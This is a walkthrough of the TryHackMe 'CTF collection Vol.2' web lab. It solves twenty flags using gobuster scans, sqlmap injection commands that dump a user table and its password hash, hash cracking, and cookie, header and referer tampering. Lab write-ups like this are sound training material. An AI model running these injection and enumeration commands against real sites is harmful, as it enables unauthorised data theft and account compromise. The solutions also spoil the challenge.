# [CTF collection Vol.2](https://tryhackme.com/room/ctfcollectionvol2)

## Sharpening up your CTF skill with the collection. The second volume is about web-based CTF.

# Easter egg

## Submit all your easter egg right here. Gonna find it all!

### Easter 1

_Hint: Check the robots_

1. Scan the web directories with gobuster to identify potential entry points

```bash
gobuster dir -u http://IP -w /root/Tools/wordlists/SecLists/Discovery/Web-Content/common.txt -x html,php,txt,js
```

[SCREEN01]

2. Navigate to `http://IP/robots.txt` or `http://IP/robots`

[SCREEN02]

3. Within the robots.txt file, you'll find a hexadecimal string. Copy this string to [CyberChef](https://gchq.github.io/CyberChef/) and apply the **From Hex** operation to decode it

[SCREEN03]

---

### Easter 2

_Decode the base64 multiple times. Don't forget there are something being encoded._

1. Copy the encoded hash from `http://IP/robots.txt`, and decode it using **Base64** four consecutive times in [CyberChef](https://gchq.github.io/CyberChef/)

[SCREEN04]

2. The decoded text points to a hidden directory `IP/DesKel_secret_base`. On this page, the flag is hidden using white text on a white background. To reveal it, either use "Select All" (Ctrl+A) or inspect the page source

[SCREEN05]

---

### Easter 3

_Directory buster with common.txt might help._

1. Navigate to `http://IP/login` and view the page source code (right-click and select "View Page Source")

[SCREEN06]

---

### Easter 4

_time-based sqli_

1. In Burp Suite, intercept a POST request from the login form

   - Right-click and select "Save item" to save the request for sqlmap

2. Use sqlmap to identify available databases

```bash
sqlmap -r request --dbs --batch
```

[SCREEN07]

3. Once the `THM_f0und_m3` database is identified, enumerate its tables

```bash
sqlmap -r request --dbs --batch -D THM_f0und_m3 --tables
```

[SCREEN08]

4. Examine the structure of the `nothing_inside` table

```bash
sqlmap -r request --dbs --batch -D THM_f0und_m3 -T nothing_inside --columns
```

[SCREEN09]

5. Extract the flag from the `Easter_4` column

```bash
sqlmap -r request --dbs --batch -D THM_f0und_m3 -T nothing_inside -C Easter_4 --sql-query "select Easter_4 from nothing_inside"
```

[SCREEN10]

---

### Easter 5

_Another sqli_

1. Enumerate columns in the `user` table

```bash
sqlmap -r request --dbs --batch -D THM_f0und_m3 -T user --columns
```

[SCREEN11]

2. Extract username and password data

```bash
sqlmap -r request --dbs --batch -D THM_f0und_m3 -T user --sql-query "select password, username from user"
```

[SCREEN12]

3. The password hash **05f3672ba34409136aa71b8d00070d1b** can be cracked using [CrackStation](https://crackstation.net/)

[SCREEN13]

4. Log in at `http://IP/login/` to retrieve the flag

[SCREEN14]

---

### Easter 6

_Look out for the response header._

1. Use `curl` with the `-I` flag to examine the HTTP headers

```bash
curl -I http://IP
```

[SCREEN15]

---

### Easter 7

_Cookie is delicious_

1. Visit `http://IP/` and open the browser's Developer Tools (F12)
   - Navigate to the Storage tab
   - Locate the cookie named "Invited" with a value of "0"
   - Change the cookie value from "0" to "1"
   - Refresh the page to reveal the flag

[SCREEN16]

### Easter 8

_Mozilla/5.0 (iPhone; CPU iPhone OS 13_1_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.1 Mobile/15E148 Safari/604.1_

1. In Developer Tools `add a custom device` with the specified `User-Agent string`

[SCREEN17]

---

### Easter 9

_Something is redirected too fast. You need to capture it._

1. After goint to `http://IP/ready/` we are being redirected further. We can click view source fast enough or just use `curl`

```bash
curl http://IP/ready/
```

[SCREEN18]

---

### Easter 10

_Look at THM URL without https:// and use it as a referrer._

1. In Burp Suite, capture a request to `http://IP/free_sub/` and modify the `Referer` header to **tryhackme.com**

[SCREEN19]

---

### Easter 11

_Temper the html_

1. On the main page, there's a menu selection where choosing "salad" gives the message **Mmmmmm... what a healthy choice, I prefer an egg**

[SCREEN20]

2. Capture this request in Burp Suite and modify the `dinner` parameter from "salad" to "egg"

[SCREEN21]

---

### Easter 12

_Fake js file_

1. Inspect the main page and notice a request to `jquery-9.1.2.js`

[SCREEN22]

2. Convert the `strl` value to hex using [CyberChef](https://gchq.github.io/CyberChef/)

[SCREEN23]

---

### Easter 13

1. Navigate directly to `http://IP/ready/gone.php` to find the flag

[SCREEN24]

### Easter 14

_Embed image code_

1. In the main page source, find a comment containing an image `src` attribute with a base64-encoded string. Use [CyberChef](https://gchq.github.io/CyberChef/) with the "Render Image" option to reveal the flag

[SCREEN25]

# Easter 15

_Try guest the alphabet and the hash code_

1. Navigate to `http://IP/game1/`

2. nput the full alphabet in both uppercase and lowercase **ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz**

3. Based on the hints provided, determine that the correct input is **GaveOver**

[SCREEN26]

### Easter 16

1. Capture the request from `http://IP/game2/`, and modify the request to include additional parameters

[SCREEN27]

---

### Easter 17

_bin -> dec -> hex -> ascii_

1. Examine the source code on the page and locate the `catz` function

2. Extract the binary input from this function

3. Convert the [binary to decimal, then to hexadecimal](https://www.rapidtables.com/convert/number/binary-to-decimal.html), and finally [to ASCII](https://www.rapidtables.com/convert/number/hex-to-ascii.htm)

[SCREEN28]

---

### Easter 18

_Request header. Format is egg:Yes_

1. Add a custom header `egg: Yes` to request in Burp Suite

[SCREEN29]

---

### Easter 19

_A thick dark line_

1. The image from `http://IP/small.png` contains flag

[SCREEN30]

---

### Easter 20

_You need to POST the data instead of GET. Burp suite or curl might help._

1. Modify request to look like the one below

[SCREEN31]
